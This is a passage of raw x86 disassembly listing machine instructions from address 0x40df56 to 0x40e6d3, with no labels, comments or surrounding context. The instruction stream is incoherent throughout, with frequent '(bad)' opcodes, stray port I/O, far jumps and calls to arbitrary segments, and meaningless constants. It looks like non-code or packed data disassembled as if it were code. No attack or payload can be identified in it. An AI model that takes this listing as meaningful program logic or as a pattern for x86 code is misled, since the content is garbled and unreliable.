  40df56:	in     al,dx
  40df57:	mov    dl,0xba
  40df59:	sbb    esi,edi
  40df5b:	fbld   TBYTE PTR [ebx-0x53]
  40df5e:	aad    0x8f
  40df60:	inc    eax
  40df61:	into   
  40df62:	pop    edi
  40df63:	push   eax
  40df64:	dec    edx
  40df65:	shr    DWORD PTR [ecx+esi*1-0x1e5531ec],1
  40df6c:	adc    ecx,DWORD PTR [edx+0x6a]
  40df6f:	loope  0x40df96
  40df71:	jno    0x40df60
  40df73:	retf   
  40df74:	adc    ebp,DWORD PTR [ecx+0x2e68772a]
  40df7a:	ins    DWORD PTR es:[edi],dx
  40df7b:	add    eax,0xa0b6a1b6
  40df80:	imul   esi,DWORD PTR ds:0x125f3b97,0xffffffbb
  40df87:	aam    0xdf
  40df89:	jno    0x40dfd9
  40df8b:	mov    ds:0x5d25301d,al
  40df90:	test   DWORD PTR [edx+0x64],ebp
  40df93:	push   eax
  40df94:	stos   BYTE PTR es:[edi],al
  40df95:	xchg   DWORD PTR [esi-0x59e21604],edx
  40df9b:	push   edx
  40df9c:	and    DWORD PTR [ebp-0x42],edx
  40df9f:	mov    ah,BYTE PTR [edx-0x20]
  40dfa2:	out    0x37,eax
  40dfa4:	outs   dx,BYTE PTR ds:[esi]
  40dfa5:	pop    edx
  40dfa6:	xchg   BYTE PTR [eax+0xd],dl
  40dfa9:	xor    bh,dl
  40dfab:	xchg   BYTE PTR [ebp+esi*4-0x77],cl
  40dfaf:	retf   
  40dfb0:	sub    ah,0xac
  40dfb3:	mov    bl,0xea
  40dfb5:	jnp    0x40df91
  40dfb7:	or     eax,0x701c3fc4
  40dfbc:	push   ds
  40dfbd:	outs   dx,DWORD PTR ds:[esi]
  40dfbe:	inc    ecx
  40dfbf:	and    edx,DWORD PTR [ebx]
  40dfc1:	ins    BYTE PTR es:[edi],dx
  40dfc2:	pop    ss
  40dfc3:	bound  esp,QWORD PTR [ecx]
  40dfc5:	push   ebp
  40dfc6:	cmp    BYTE PTR [ebx+0x32],0x54
  40dfca:	mov    ebx,0x33593576
  40dfcf:	int3   
  40dfd0:	icebp  
  40dfd1:	and    esp,DWORD PTR [edx+edi*1+0x53]
  40dfd5:	pop    ebp
  40dfd6:	xchg   esp,eax
  40dfd7:	dec    ecx
  40dfd8:	scas   al,BYTE PTR es:[edi]
  40dfd9:	cmp    DWORD PTR es:0x99d0e6e,ebp
  40dfe0:	xchg   esp,eax
  40dfe1:	neg    ecx
  40dfe3:	adc    dh,BYTE PTR [ecx-0x3]
  40dfe6:	and    DWORD PTR [edi+eax*2+0x796f300a],esp
  40dfed:	jmp    0xa500cc62
  40dff2:	push   edi
  40dff3:	dec    esp
  40dff4:	sar    edi,cl
  40dff6:	iret   
  40dff7:	test   al,0x87
  40dff9:	cmp    al,0x47
  40dffb:	aam    0xed
  40dffd:	mov    ch,BYTE PTR [edx+0x5e2ffa26]
  40e003:	(bad)
  40e006:	and    eax,0x48fe566e
  40e00b:	push   eax
  40e00c:	cmc    
  40e00d:	sub    BYTE PTR [edi],dl
  40e00f:	out    0x54,al
  40e011:	out    dx,eax
  40e012:	dec    ebx
  40e013:	adc    bh,bl
  40e015:	jg     0x40e074
  40e017:	outs   dx,DWORD PTR ds:[esi]
  40e018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e019:	lods   eax,DWORD PTR ds:[esi]
  40e01a:	in     eax,0xc0
  40e01c:	out    dx,al
  40e01d:	pushf  
  40e01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e01f:	scas   al,BYTE PTR es:[edi]
  40e020:	pop    es
  40e021:	or     edi,DWORD PTR [esi-0x6e6cf99a]
  40e027:	or     BYTE PTR [edi],bh
  40e029:	xor    al,0xcd
  40e02b:	gs add eax,0x7660923c
  40e031:	mov    esi,0x93b2dd71
  40e036:	jmp    0x40e04e
  40e038:	retf   0x30ee
  40e03b:	inc    esp
  40e03c:	add    eax,0xd6021bab
  40e041:	inc    esi
  40e042:	xor    ch,ah
  40e044:	sbb    edi,ebx
  40e046:	pop    ss
  40e047:	test   DWORD PTR [ecx],0x90246643
  40e04d:	call   0xc12d1ee4
  40e052:	inc    ecx
  40e053:	je     0x40e017
  40e055:	pop    esp
  40e056:	test   eax,0x7eb5fee9
  40e05b:	cmp    DWORD PTR [esi+0x5747e62d],0x48776fbd
  40e065:	fwait
  40e066:	sbb    eax,0x9bd40434
  40e06b:	bound  esp,QWORD PTR [ecx-0x85c9e5f]
  40e071:	data16 sar BYTE PTR [esi],cl
  40e074:	stc    
  40e075:	sub    DWORD PTR [edi+0x2f473781],ebx
  40e07b:	arpl   di,sp
  40e07d:	push   0xdf88ec86
  40e082:	pop    ecx
  40e083:	push   esi
  40e084:	cmp    bh,ch
  40e086:	dec    ebx
  40e087:	adc    DWORD PTR [ecx-0x75de35b9],edx
  40e08d:	sub    DWORD PTR ds:0x571472cf,ebp
  40e093:	test   eax,0x4bc22ccc
  40e098:	(bad)  
  40e099:	aas    
  40e09a:	cmp    bl,ah
  40e09c:	ret    
  40e09d:	(bad)  
  40e09e:	hlt    
  40e09f:	mov    esp,0xc0660024
  40e0a4:	bound  esi,QWORD PTR [ebx+0x59af5538]
  40e0aa:	xchg   DWORD PTR [esi+0x160c847a],edi
  40e0b0:	pop    esp
  40e0b1:	(bad)  
  40e0b2:	out    dx,eax
  40e0b3:	aaa    
  40e0b4:	(bad)  
  40e0b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0b6:	ins    DWORD PTR es:[edi],dx
  40e0b7:	cwd    
  40e0b9:	(bad)  
  40e0ba:	adc    DWORD PTR [esi-0x53f14711],eax
  40e0c0:	ss int 0x7
  40e0c3:	mov    ds:0xcb1c9de2,eax
  40e0c8:	xor    DWORD PTR [ecx-0xe],0xe7ae514f
  40e0cf:	xchg   esi,eax
  40e0d0:	add    al,0x14
  40e0d2:	pop    ebp
  40e0d3:	std    
  40e0d4:	adc    eax,DWORD PTR [ebx-0x344e5e0c]
  40e0da:	out    dx,eax
  40e0db:	sbb    esp,ebp
  40e0dd:	jle    0x40e117
  40e0df:	mov    esi,0x489d0702
  40e0e4:	dec    esi
  40e0e5:	jecxz  0x40e0d3
  40e0e7:	shl    DWORD PTR ds:0xf662ffb1,1
  40e0ed:	sub    DWORD PTR ds:[edx+edx*2-0x6],0xffffffc7
  40e0f3:	jp     0x40e131
  40e0f5:	mov    esi,0xe05c9650
  40e0fa:	push   ds
  40e0fb:	ins    BYTE PTR es:[edi],dx
  40e0fc:	popf   
  40e0fd:	inc    esi
  40e0fe:	adc    edi,DWORD PTR [ebp+0x332aa75]
  40e104:	test   eax,0x2c6f419c
  40e109:	push   ecx
  40e10a:	mov    bl,0xa3
  40e10c:	es (bad) 
  40e10e:	jmp    DWORD PTR [edi]
  40e110:	and    al,0xeb
  40e112:	fdiv   DWORD PTR [ecx+0x20460ed]
  40e118:	call   0x887e:0x168c13e
  40e11f:	imul   ebp,DWORD PTR [ebx-0x66fa65f9],0xffffffe8
  40e126:	add    edx,DWORD PTR [ebx]
  40e128:	adc    BYTE PTR ds:0x4da8600e,0x5c
  40e12f:	repnz dec edi
  40e131:	out    0xcf,eax
  40e133:	pushf  
  40e134:	popa   
  40e135:	adc    BYTE PTR [ecx+eiz*8+0x10],dh
  40e139:	jmp    0x40e18e
  40e13b:	out    0xee,eax
  40e13d:	add    bl,ch
  40e13f:	mov    esi,0x6f651252
  40e144:	repz mov ch,0x24
  40e147:	es cmp al,0xf6
  40e14a:	add    BYTE PTR [ecx],0x5a
  40e14d:	pushf  
  40e14e:	sbb    esi,DWORD PTR [esp+esi*1]
  40e151:	xchg   DWORD PTR [edi],esp
  40e153:	jl     0x40e17f
  40e155:	ja     0x40e198
  40e157:	cmp    al,0x9f
  40e159:	adc    al,0xfb
  40e15b:	ins    DWORD PTR es:[edi],dx
  40e15c:	and    al,0xf4
  40e15e:	in     eax,0xa4
  40e160:	popa   
  40e161:	gs gs or eax,0x542b8fb5
  40e168:	inc    esp
  40e169:	js     0x40e124
  40e16b:	jmp    0x973a:0x220647ff
  40e172:	rol    BYTE PTR [ebx-0x21],0x1a
  40e176:	mov    dh,0x74
  40e178:	pop    ss
  40e179:	inc    eax
  40e17a:	sbb    eax,0xc1ed3439
  40e17f:	push   es
  40e180:	test   BYTE PTR [edx-0x7a947dbe],ch
  40e186:	pop    ds
  40e187:	stc    
  40e188:	adc    bh,BYTE PTR [edi+ecx*8]
  40e18b:	ss aam 0x31
  40e18e:	call   0x8295:0x3c88c6b1
  40e195:	jmp    0x6709:0x2330aaf8
  40e19c:	dec    esi
  40e19d:	and    DWORD PTR [eax],ebx
  40e19f:	sub    ebx,DWORD PTR [ebx+0x57]
  40e1a2:	sub    dl,BYTE PTR [esi]
  40e1a4:	hlt    
  40e1a5:	cmp    eax,0x94826bd7
  40e1aa:	sbb    cl,dl
  40e1ac:	out    dx,al
  40e1ad:	shl    ebx,cl
  40e1af:	loopne 0x40e15c
  40e1b1:	mov    bh,0xbb
  40e1b3:	scas   eax,DWORD PTR es:[edi]
  40e1b4:	xor    al,0xe7
  40e1b6:	repnz pushf 
  40e1b8:	mov    dl,0xd6
  40e1ba:	sbb    eax,DWORD PTR [ebx-0x69]
  40e1bd:	ror    esi,0x55
  40e1c0:	xchg   DWORD PTR ds:[ebx-0x3ff00ea5],edi
  40e1c7:	mov    eax,0x2a5ec6a8
  40e1cc:	cli    
  40e1cd:	(bad)  
  40e1ce:	cs fwait
  40e1d0:	jmp    0x40e22d
  40e1d2:	jmp    0x73b1:0x9bda366
  40e1d9:	mov    ebp,0xc6b295a7
  40e1de:	inc    esp
  40e1df:	int3   
  40e1e0:	and    al,0x7c
  40e1e2:	retf   0x976b
  40e1e5:	inc    esi
  40e1e6:	movzx  esp,WORD PTR [edx-0x47]
  40e1ea:	sbb    edx,DWORD PTR [edx+0x2767d959]
  40e1f0:	and    al,BYTE PTR [edx+0x2d]
  40e1f3:	push   ss
  40e1f4:	loope  0x40e1e1
  40e1f6:	jmp    0xd27c:0xdafdc8f7
  40e1fd:	and    BYTE PTR [ebx-0x7f],0x8
  40e201:	and    DWORD PTR [ebp+0x47e0b9b1],0x36
  40e208:	mov    ecx,0x9d500a93
  40e20d:	loop   0x40e1ed
  40e20f:	jno    0x40e1a6
  40e211:	das    
  40e212:	repnz addr16 popf 
  40e215:	in     eax,dx
  40e216:	adc    edx,DWORD PTR [ecx-0x46]
  40e219:	sub    eax,0x66ad0842
  40e21e:	aad    0xb5
  40e220:	inc    edi
  40e221:	lahf   
  40e222:	mov    ebp,0x36fbcd4d
  40e227:	mov    eax,ds:0xf4f10e68
  40e22c:	mov    bl,0x55
  40e22e:	and    al,0xe1
  40e230:	push   es
  40e231:	sub    dh,BYTE PTR [eax]
  40e233:	cld    
  40e234:	push   es
  40e235:	jp     0x40e243
  40e237:	leave  
  40e238:	xchg   esp,eax
  40e239:	inc    edx
  40e23a:	inc    edi
  40e23b:	sbb    dh,BYTE PTR [ecx-0x243a40c5]
  40e241:	pop    ecx
  40e242:	ins    BYTE PTR es:[edi],dx
  40e243:	gs das 
  40e245:	adc    eax,0xcae95889
  40e24a:	out    dx,eax
  40e24b:	cmp    dl,BYTE PTR [ebx]
  40e24d:	cld    
  40e24e:	mov    ecx,0x54a0a06
  40e253:	inc    esi
  40e254:	es leave 
  40e256:	je     0x40e225
  40e258:	ror    BYTE PTR [ecx+eiz*2+0x7],cl
  40e25c:	dec    esi
  40e25d:	loope  0x40e24b
  40e25f:	push   esp
  40e260:	lods   al,BYTE PTR ds:[esi]
  40e261:	mov    ds:0x538e37db,eax
  40e266:	xor    eax,0xff6d5a56
  40e26b:	inc    esi
  40e26c:	cmp    BYTE PTR ds:0x33e0dea3,dh
  40e272:	add    eax,0x7aba6878
  40e277:	stos   BYTE PTR es:[edi],al
  40e278:	push   edi
  40e279:	mov    edi,0x8074b18f
  40e27e:	(bad)  
  40e27f:	fisubr WORD PTR [ecx]
  40e281:	push   cs
  40e282:	cmp    dl,al
  40e284:	ds xor al,0x93
  40e287:	idiv   ch
  40e289:	mov    ebx,0x5cde419a
  40e28e:	dec    ecx
  40e28f:	outs   dx,BYTE PTR ds:[esi]
  40e290:	loopne 0x40e2ea
  40e292:	add    al,0x57
  40e294:	dec    edi
  40e295:	jmp    DWORD PTR [edi+eax*8-0x15d8e5c2]
  40e29c:	cdq    
  40e29d:	dec    esp
  40e29e:	xor    BYTE PTR [edx-0x10],bh
  40e2a1:	and    ch,0x49
  40e2a4:	repz dec ecx
  40e2a6:	cdq    
  40e2a7:	pop    esp
  40e2a8:	stos   DWORD PTR es:[edi],eax
  40e2a9:	push   ss
  40e2aa:	div    BYTE PTR ds:0x8f172d02
  40e2b0:	(bad)  
  40e2b2:	test   DWORD PTR [edx+0x1f04bb2f],edi
  40e2b8:	push   ebx
  40e2b9:	aaa    
  40e2ba:	sbb    DWORD PTR [edi+0x5499e06d],ebp
  40e2c0:	adc    al,BYTE PTR [eax+edx*8-0x21f5c900]
  40e2c7:	lds    esp,FWORD PTR [ecx]
  40e2c9:	xor    BYTE PTR [ecx],dh
  40e2cb:	cmp    ebx,DWORD PTR [ecx+0x5a8e83d3]
  40e2d1:	inc    eax
  40e2d2:	jecxz  0x40e33a
  40e2d4:	push   ecx
  40e2d5:	add    al,0xb8
  40e2d7:	adc    DWORD PTR [ebp+ebp*8-0x4d],ecx
  40e2db:	stos   DWORD PTR es:[edi],eax
  40e2dc:	fisub  DWORD PTR [ecx-0x79]
  40e2df:	dec    ebp
  40e2e0:	aaa    
  40e2e1:	stc    
  40e2e2:	iret   
  40e2e3:	in     eax,0x1a
  40e2e5:	stos   DWORD PTR es:[edi],eax
  40e2e6:	rcl    DWORD PTR ds:0xf95a8c4c,cl
  40e2ec:	xchg   edx,eax
  40e2ed:	pushf  
  40e2ee:	shr    ebp,cl
  40e2f0:	jle    0x40e35d
  40e2f2:	fidiv  WORD PTR [esi-0x64]
  40e2f6:	cli    
  40e2f7:	cmc    
  40e2f8:	ret    0x8aea
  40e2fb:	add    BYTE PTR [eax+eax*8-0x64],ch
  40e2ff:	sub    DWORD PTR [edx+0x1fa6a671],eax
  40e305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e306:	xor    BYTE PTR [edx],cl
  40e308:	xor    bh,BYTE PTR [ecx+0x36aa7714]
  40e30e:	jae    0x40e389
  40e310:	jmp    0xdd709775
  40e315:	cwde   
  40e316:	pop    es
  40e317:	call   0xe5a1:0x3bd6ff74
  40e31e:	iret   
  40e31f:	fsub   QWORD PTR [esi+0x6b6bc6f4]
  40e325:	rol    DWORD PTR [ebx],0xed
  40e328:	mov    esi,0x5ca79709
  40e32d:	jge    0x40e364
  40e32f:	retf   
  40e330:	mov    ebx,0xa812bd56
  40e335:	popf   
  40e336:	aam    0x5f
  40e338:	(bad)  
  40e339:	jno    0x40e337
  40e33b:	cld    
  40e33c:	fist   WORD PTR [esi+eiz*4]
  40e33f:	push   0x71
  40e341:	sub    al,0x3c
  40e343:	push   es
  40e344:	pushf  
  40e345:	fisttp QWORD PTR [ecx+eax*1+0x38c97675]
  40e34c:	mov    eax,0x25090d7
  40e351:	xchg   ebp,eax
  40e352:	enter  0x5e2f,0x1c
  40e356:	and    esi,eax
  40e358:	aaa    
  40e359:	cmp    eax,0x3c7032a4
  40e35e:	dec    ebp
  40e35f:	push   0xffffffe1
  40e361:	repz retf 
  40e363:	clc    
  40e364:	xchg   edx,eax
  40e365:	and    al,0xf
  40e367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e368:	ja     0x40e371
  40e36a:	push   0x13
  40e36c:	sbb    esp,edi
  40e36e:	(bad)  
  40e36f:	cmp    al,0xaa
  40e371:	data16 fcmovne st,st(4)
  40e374:	neg    DWORD PTR ds:0xebfd0211
  40e37a:	mov    ?,WORD PTR [ebp+0x4716a703]
  40e380:	dec    esp
  40e381:	(bad)  
  40e382:	cld    
  40e383:	rol    BYTE PTR [esi-0x6b],cl
  40e386:	push   ebp
  40e387:	mov    eax,ds:0x390ee49b
  40e38c:	mov    dh,0xc
  40e38e:	js     0x40e3f0
  40e390:	in     al,0xf2
  40e392:	xchg   esi,eax
  40e393:	jp     0x40e3da
  40e395:	(bad)  
  40e396:	test   eax,0x1a7c3147
  40e39b:	retf   0xc630
  40e39e:	mov    eax,ds:0xaeb8d28a
  40e3a3:	xor    eax,0x2ca4e8fb
  40e3a8:	fcmovne st,st(1)
  40e3aa:	aam    0x37
  40e3ac:	mov    al,0xbb
  40e3ae:	mov    esi,?
  40e3b0:	lahf   
  40e3b1:	dec    edx
  40e3b2:	xchg   ebx,eax
  40e3b3:	pop    ebx
  40e3b4:	lds    edi,FWORD PTR [esi]
  40e3b6:	lea    esi,[eax]
  40e3b8:	arpl   WORD PTR [ebx+esi*1-0x248f4c71],dx
  40e3bf:	push   0x562b0ce2
  40e3c4:	jmp    0x40e3e0
  40e3c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c7:	sub    BYTE PTR [edi+0x282d1d1d],dh
  40e3cd:	mov    ch,0xd
  40e3cf:	retf   0x3072
  40e3d2:	lock sahf 
  40e3d4:	inc    edi
  40e3d5:	ret    0x9e11
  40e3d8:	or     al,0x83
  40e3da:	call   FWORD PTR [edi]
  40e3dc:	es push esp
  40e3de:	mov    ch,0x37
  40e3e0:	add    esi,esi
  40e3e2:	out    dx,al
  40e3e3:	imul   eax,DWORD PTR [ebp+0x38be7de6],0xffffffd6
  40e3ea:	jae    0x40e435
  40e3ec:	sar    DWORD PTR [esi],1
  40e3ee:	cmc    
  40e3ef:	or     esp,DWORD PTR [edx-0x5c6ecc13]
  40e3f5:	(bad)  
  40e3f6:	sbb    al,0xe9
  40e3f8:	xor    BYTE PTR [edi+0x3f],ah
  40e3fb:	fbstp  TBYTE PTR [edx]
  40e3fd:	mov    ch,0x4e
  40e3ff:	adc    DWORD PTR [edx+ecx*1-0x2094f961],ebx
  40e406:	push   ds
  40e407:	mul    DWORD PTR [edi]
  40e409:	ins    BYTE PTR es:[edi],dx
  40e40a:	clc    
  40e40b:	fsubr  st(2),st
  40e40d:	cmc    
  40e40e:	xchg   ebp,eax
  40e40f:	and    BYTE PTR [ebp+0x5bf5a244],dl
  40e415:	xor    eax,0x650785de
  40e41a:	in     eax,dx
  40e41b:	scas   al,BYTE PTR es:[edi]
  40e41c:	add    al,bl
  40e41e:	cdq    
  40e41f:	retf   
  40e420:	adc    bh,BYTE PTR [edx+0x645ee8f3]
  40e426:	data16 add dh,ch
  40e429:	shl    DWORD PTR [ebx],cl
  40e42b:	pop    eax
  40e42c:	pop    ebp
  40e42d:	add    al,0x9b
  40e42f:	test   eax,0x706444cb
  40e434:	xor    al,BYTE PTR [edi]
  40e436:	in     al,dx
  40e437:	push   esi
  40e438:	mov    al,0x54
  40e43a:	out    0xe2,eax
  40e43c:	mov    bh,0x5d
  40e43e:	out    dx,al
  40e43f:	stos   BYTE PTR es:[edi],al
  40e440:	cld    
  40e441:	cmp    DWORD PTR [eax+0x4c],edi
  40e444:	mov    dl,0x5e
  40e446:	dec    esp
  40e447:	test   DWORD PTR ds:0x274a31c6,0x3d625fe8
  40e451:	loopne 0x40e458
  40e453:	mov    al,0xc4
  40e455:	ret    0xe38a
  40e458:	or     ebp,DWORD PTR [edx-0x70]
  40e45b:	inc    esp
  40e45c:	cmp    eax,0x16a8a1f8
  40e461:	xor    BYTE PTR [ebx+ebx*8-0x2eddfaec],al
  40e468:	imul   esi,DWORD PTR [edx+0x339ab360],0xffffffa0
  40e46f:	or     eax,0xec1e3c1e
  40e474:	inc    edi
  40e475:	jne    0x40e421
  40e477:	imul   ebp,ecx,0x66
  40e47a:	xchg   ebp,eax
  40e47b:	call   0x54919a5f
  40e480:	dec    edx
  40e481:	das    
  40e482:	add    ah,BYTE PTR [edi]
  40e484:	mov    DWORD PTR [eax+0x4],edx
  40e487:	dec    esp
  40e488:	out    dx,al
  40e489:	fist   DWORD PTR [ebx-0x68]
  40e48c:	push   ebx
  40e48d:	mov    esp,0x69203d27
  40e492:	sti    
  40e493:	sub    DWORD PTR [edi+0x183d99a3],0xffffffa8
  40e49a:	sbb    ebx,DWORD PTR [edx-0x7e]
  40e49d:	stc    
  40e49e:	retf   0x620e
  40e4a1:	cmp    eax,0x118890fc
  40e4a6:	fisttp WORD PTR [eax]
  40e4a8:	fwait
  40e4a9:	add    al,0x90
  40e4ab:	mov    ?,WORD PTR [edx]
  40e4ad:	repz mov ds:0xac8328ae,al
  40e4b3:	outs   dx,DWORD PTR ds:[esi]
  40e4b4:	out    dx,eax
  40e4b5:	stos   DWORD PTR es:[edi],eax
  40e4b6:	and    bl,BYTE PTR [ebx+0x74f5a76f]
  40e4bc:	retf   
  40e4bd:	fwait
  40e4be:	xchg   esi,eax
  40e4bf:	mov    ds:0x3200d1c9,al
  40e4c4:	mov    ecx,0x9f62251f
  40e4c9:	cwde   
  40e4ca:	push   es
  40e4cb:	enter  0xe44c,0x79
  40e4cf:	jmp    0x3b00:0x49b741ab
  40e4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4d7:	sub    BYTE PTR [ecx+0x120f463c],bl
  40e4dd:	fadd   st,st(5)
  40e4df:	dec    esi
  40e4e0:	push   ecx
  40e4e1:	inc    ebx
  40e4e2:	mov    edx,0xdbdc8c8c
  40e4e7:	retf   
  40e4e8:	loope  0x40e4fc
  40e4ea:	mov    ch,0xb8
  40e4ec:	mov    dh,0xbc
  40e4ee:	mov    eax,0x10a578bb
  40e4f3:	pop    edx
  40e4f4:	scas   eax,DWORD PTR es:[edi]
  40e4f5:	(bad)  
  40e4f6:	sub    dh,BYTE PTR [esi+ebx*2-0x9]
  40e4fa:	repz fisttp QWORD PTR [edx-0x10]
  40e4fe:	outs   dx,DWORD PTR ds:[esi]
  40e4ff:	sub    esp,esp
  40e501:	xor    ebp,DWORD PTR ds:0x3076ae20
  40e507:	(bad)  
  40e508:	nop
  40e509:	(bad)  
  40e50a:	cmp    al,0xc5
  40e50c:	mov    ah,0x6e
  40e50e:	pushf  
  40e50f:	sti    
  40e510:	(bad)  
  40e511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e512:	jno    0x40e55e
  40e514:	or     dh,BYTE PTR [edi+0x22]
  40e517:	xchg   ebp,eax
  40e518:	mov    dh,0xab
  40e51a:	dec    ecx
  40e51b:	int3   
  40e51c:	add    DWORD PTR [eax-0x4756f988],ebx
  40e522:	sar    DWORD PTR ds:0x49406550,0x89
  40e529:	lahf   
  40e52a:	push   ebx
  40e52b:	push   edx
  40e52c:	adc    ah,0x1b
  40e52f:	push   esp
  40e530:	cmp    dh,BYTE PTR cs:[edx+0x38]
  40e534:	mov    esp,0xc1755eac
  40e539:	fild   WORD PTR [esi+0x45102946]
  40e53f:	daa    
  40e540:	repz mov esi,0xdbb2f6e2
  40e546:	lahf   
  40e547:	jecxz  0x40e532
  40e549:	inc    ebp
  40e54a:	fisubr DWORD PTR [ebp-0x62]
  40e54d:	or     BYTE PTR [edi-0x2055830a],0x8e
  40e554:	inc    esi
  40e555:	pop    edi
  40e556:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e557:	dec    esp
  40e558:	pop    eax
  40e559:	scas   al,BYTE PTR es:[edi]
  40e55a:	or     eax,0x3f0c69fc
  40e55f:	xchg   BYTE PTR [ecx+0x4a18f88],cl
  40e565:	enter  0x7b6f,0x32
  40e569:	in     eax,0x75
  40e56b:	stos   BYTE PTR es:[edi],al
  40e56c:	mov    eax,ds:0x89872d4
  40e571:	inc    ecx
  40e572:	fs xchg ebx,eax
  40e574:	sub    bl,BYTE PTR [ebp+ebx*1-0x5f]
  40e578:	add    bl,BYTE PTR [eax]
  40e57a:	out    dx,eax
  40e57b:	push   ss
  40e57c:	mov    bl,0xe6
  40e57e:	jnp    0x40e552
  40e580:	retf   0x1155
  40e583:	in     eax,0x1f
  40e585:	repz xor BYTE PTR [edx],al
  40e588:	sbb    DWORD PTR [eax],ebx
  40e58a:	imul   DWORD PTR [ecx]
  40e58c:	in     al,0xe1
  40e58e:	(bad)  
  40e58f:	(bad)  
  40e590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e591:	fst    DWORD PTR [ebx+0x31]
  40e594:	mov    eax,0xb0611cbe
  40e599:	cmp    BYTE PTR [ecx+0x6233b4de],ch
  40e59f:	mov    al,0xcc
  40e5a1:	pop    eax
  40e5a2:	data16 (bad) 
  40e5a4:	jl     0x40e535
  40e5a6:	sbb    ebp,DWORD PTR [edi+0x3c63feff]
  40e5ac:	arpl   WORD PTR [edi+0x1],ax
  40e5af:	les    esp,FWORD PTR [eax]
  40e5b1:	add    ch,BYTE PTR [ebp-0x45]
  40e5b4:	add    BYTE PTR [edx-0x7],dl
  40e5b7:	mov    ebp,0x2175a297
  40e5bc:	div    DWORD PTR [ebx]
  40e5be:	xchg   esp,eax
  40e5bf:	pop    ebp
  40e5c0:	push   ebp
  40e5c1:	cmc    
  40e5c2:	cmp    BYTE PTR [ebx+0x57],0xc
  40e5c6:	pop    edx
  40e5c7:	neg    DWORD PTR [esi+0x3b]
  40e5ca:	outs   dx,BYTE PTR ds:[esi]
  40e5cb:	push   cs
  40e5cc:	movaps xmm5,XMMWORD PTR [edx+0x37]
  40e5d0:	push   ebp
  40e5d1:	ins    BYTE PTR es:[edi],dx
  40e5d2:	mov    ch,0x8a
  40e5d4:	in     eax,dx
  40e5d5:	inc    ebx
  40e5d6:	jns    0x40e640
  40e5d8:	jnp    0x40e603
  40e5da:	icebp  
  40e5db:	cmp    al,0x7d
  40e5dd:	cmp    cl,BYTE PTR [eax+eiz*4-0x6b]
  40e5e1:	sti    
  40e5e2:	rcr    DWORD PTR [ebx+0x24],1
  40e5e5:	jb     0x40e5ea
  40e5e7:	push   esi
  40e5e8:	or     DWORD PTR [ecx+eiz*8+0x24a19d5a],ecx
  40e5ef:	fs (bad) 
  40e5f2:	loopne 0x40e5b9
  40e5f4:	das    
  40e5f5:	pop    esp
  40e5f6:	loope  0x40e5a2
  40e5f8:	dec    ebp
  40e5f9:	adc    al,0xa5
  40e5fb:	dec    edi
  40e5fc:	(bad)  
  40e5fd:	arpl   bx,sp
  40e5ff:	ret    
  40e600:	dec    ebp
  40e601:	xlat   BYTE PTR ds:[ebx]
  40e602:	or     BYTE PTR [esi-0x4c],al
  40e605:	ins    BYTE PTR es:[edi],dx
  40e606:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e607:	xchg   ebp,eax
  40e608:	add    DWORD PTR [edi+0x69],ebx
  40e60b:	cmc    
  40e60c:	enter  0x955d,0x47
  40e610:	scas   eax,DWORD PTR es:[edi]
  40e611:	xchg   esp,eax
  40e612:	scas   eax,DWORD PTR es:[edi]
  40e613:	mov    cl,0xff
  40e615:	leave  
  40e616:	(bad)  
  40e618:	into   
  40e619:	add    BYTE PTR [edx],cl
  40e61b:	cmp    DWORD PTR [esi-0x3a],esp
  40e61e:	stc    
  40e61f:	call   DWORD PTR [edx-0x619f624c]
  40e625:	mov    BYTE PTR [eax-0x79846895],ah
  40e62b:	dec    ebp
  40e62c:	inc    ecx
  40e62d:	jge    0x40e642
  40e62f:	mov    WORD PTR [eax],ss
  40e631:	lds    esp,FWORD PTR [ecx-0x19caf500]
  40e637:	stos   DWORD PTR es:[edi],eax
  40e638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e639:	jbe    0x40e69e
  40e63b:	sbb    DWORD PTR [ecx-0xa2c49d5],esp
  40e641:	push   ebp
  40e642:	push   esp
  40e643:	stos   BYTE PTR es:[edi],al
  40e644:	mov    eax,0x588ae6cd
  40e649:	cmp    edi,DWORD PTR [eax-0x7585d88f]
  40e64f:	loop   0x40e619
  40e651:	xchg   edi,eax
  40e652:	adc    DWORD PTR [esi],ebp
  40e654:	jl     0x40e5f7
  40e656:	adc    ecx,DWORD PTR [edx-0x62]
  40e659:	or     DWORD PTR ds:0xf4b98de8,eax
  40e65f:	mov    BYTE PTR [edx],ch
  40e661:	call   0xafc5eb8d
  40e666:	mov    ebp,0xde2695de
  40e66b:	sbb    DWORD PTR [ecx+0x4c6e1124],0x74
  40e672:	cli    
  40e673:	mov    WORD PTR [edi+0x3c0a23ae],?
  40e679:	sub    ch,BYTE PTR [edx-0x65]
  40e67c:	push   ss
  40e67d:	xor    edx,DWORD PTR [eax-0x6295732a]
  40e683:	cmp    cl,BYTE PTR [ebx-0xd4057e3]
  40e689:	fs stc 
  40e68b:	ret    0x125a
  40e68e:	add    edi,esi
  40e690:	stos   DWORD PTR es:[edi],eax
  40e691:	pop    edi
  40e692:	test   BYTE PTR [ebp-0x4a],0x8a
  40e696:	push   ss
  40e697:	xor    cl,bl
  40e699:	xchg   esi,eax
  40e69a:	sbb    DWORD PTR [ecx+0x72f69213],esi
  40e6a0:	mov    WORD PTR [ebx-0xf],gs
  40e6a3:	(bad)  
  40e6a4:	mov    dl,0xb2
  40e6a6:	imul   ecx,esp,0x70
  40e6a9:	mov    WORD PTR [ebx+ebx*4+0x5a],fs
  40e6ad:	gs mov esi,0x9726180f
  40e6b3:	push   0x60042a67
  40e6b8:	pop    eax
  40e6b9:	aad    0xa8
  40e6bb:	sub    ah,BYTE PTR [ebx+edx*1]
  40e6be:	addr16 retf 0xa0c5
  40e6c2:	std    
  40e6c3:	test   BYTE PTR [edi-0x4b],dl
  40e6c6:	imul   edi,DWORD PTR [ecx],0xe0f7c2d8
  40e6cc:	ds je  0x40e709
  40e6cf:	push   ebx
  40e6d0:	sbb    bl,bl
  40e6d2:	push   es
  40e6d3:	push   ecx
